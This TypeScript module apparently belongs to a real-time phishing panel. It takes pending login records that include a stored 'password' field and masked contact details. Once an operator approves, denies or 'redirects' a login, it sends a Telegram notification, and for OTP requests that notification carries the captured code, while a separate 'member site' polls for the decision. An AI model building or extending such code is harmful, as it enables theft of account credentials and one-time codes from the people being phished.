import { getSql } from '@/lib/db'
import {
  sendAdminLoginOutcomeNotification,
  type AdminLoginOutcomeAction,
  type AdminRequestKind,
} from '@/lib/admin-login-outcome'

let columnEnsured = false

async function ensureOutcomeNotifiedColumn(): Promise<void> {
  if (!process.env.DATABASE_URL || columnEnsured) return
  const sql = getSql()
  await sql`ALTER TABLE pending_logins ADD COLUMN IF NOT EXISTS admin_outcome_notified_at BIGINT`
  columnEnsured = true
}

function statusToAction(status: string): AdminLoginOutcomeAction | null {
  if (status === 'approved') return 'approve'
  if (status === 'denied') return 'deny'
  if (status === 'redirected') return 'redirect'
  return null
}

function normalizeRequestKind(v: unknown): AdminRequestKind {
  return v === 'otp' ? 'otp' : 'login'
}

/** Send admin approve/deny/redirect Telegram once, when the member site polls status. */
export async function claimAndSendAdminLoginOutcome(id: string): Promise<void> {
  if (!process.env.DATABASE_URL) return

  await ensureOutcomeNotifiedColumn()
  const sql = getSql()
  const now = Date.now()

  const rows = await sql`
    UPDATE pending_logins
    SET admin_outcome_notified_at = ${now}
    WHERE id = ${id}
      AND status IN ('approved', 'denied', 'redirected')
      AND admin_outcome_notified_at IS NULL
    RETURNING user_id AS "userId", method, masked_email AS "maskedEmail", masked_phone AS "maskedPhone", status,
      COALESCE(request_kind, 'login') AS "requestKind", password
  `

  const row = rows[0] as Record<string, unknown> | undefined
  if (!row) return

  const action = statusToAction(String(row.status))
  if (!action) return

  const requestKind = normalizeRequestKind(row.requestKind)

  try {
    await sendAdminLoginOutcomeNotification({
      action,
      requestKind,
      userId: String(row.userId ?? ''),
      method: row.method === 'email' ? 'email' : 'text',
      maskedEmail: String(row.maskedEmail ?? ''),
      maskedPhone: String(row.maskedPhone ?? ''),
      code: requestKind === 'otp' ? String(row.password ?? '') : undefined,
    })
  } catch (err) {
    await sql`
      UPDATE pending_logins
      SET admin_outcome_notified_at = NULL
      WHERE id = ${id} AND admin_outcome_notified_at = ${now}
    `
    throw err
  }
}
